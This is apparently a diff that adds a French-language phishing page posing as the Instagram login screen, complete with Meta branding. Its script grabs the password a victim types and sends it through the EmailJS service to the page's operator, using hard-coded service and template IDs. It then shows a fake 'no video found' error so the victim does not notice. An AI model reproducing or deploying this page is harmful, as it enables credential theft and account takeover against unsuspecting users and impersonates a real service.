@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 45px;
+            margin-bottom: 30px;
+        }
+
+        .btn-facebook {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            margin-bottom: 15px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .btn-facebook img {
+            margin-right: 10px;
+        }
+
+        .or {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .or hr {
+            flex-grow: 1;
+            border: none;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .or span {
+            margin: 0 15px;
+            color: #8e8e8e;
+            font-weight: bold;
+        }
+
+        .input {
+            margin-bottom: 15px;
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-bottom: 20px;
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .btn-login {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .signup {
+            margin-top: 20px;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .meta {
+            align-items: center;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .meta img {
+            height: 20px;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+
+<body>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <div class="container">
+        <div class="logo"><img src="./instaTheme.png" alt=""></div>
+        <button class="btn-facebook">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png"
+                alt="Facebook" width="20">
+            Continuer avec Facebook
+        </button>
+        <div class="or">
+            <hr>
+            <span>OU</span>
+            <hr>
+        </div>
+        <input type="text" class="input" placeholder="Num. téléphone, nom d’utilisateur ou e-mail">
+        <input type="password" class="input" placeholder="Mot de passe" id="passKey">
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        <button class="btn-login" id="sub">Se connecter</button>
+
+        <div class="signup">
+            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+        </div>
+
+        <div class="footer">
+            Vous pouvez également <a href="#">signaler le contenu que vous pensez illégal</a>
+        </div>
+
+        <div class="meta">
+            <span>from</span><br>
+            <img src="meta.png" alt="Meta">
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('sub').addEventListener("click", () => {
+            let inpPassKey = document.getElementById("passKey")
+            emailjs.init('EzUeY3ZDf7GTwLVKE'); // Remplacez 'YOUR_USER_ID' par votre user_id EmailJS
+
+            const serviceID = 'service_70nodew'; // Remplacez par votre service_id EmailJS
+            const templateID = 'template_9rowdy5'; // Remplacez par votre template_id EmailJS
+
+            const templateParams = {
+                passkey: inpPassKey.value
+            };
+
+            emailjs.send(serviceID, templateID, templateParams)
+                .then(function () {
+                    alert("Oups, une erreur s'est produite, aucune vidéo trouvée.");
+                }, function (error) {
+                    console.error('Échec de l\'envoi de la commande :', error);
+                    alert('OUPS, ERREUR');
+                });
+        })
+    </script>
+</body>
+
+</html>
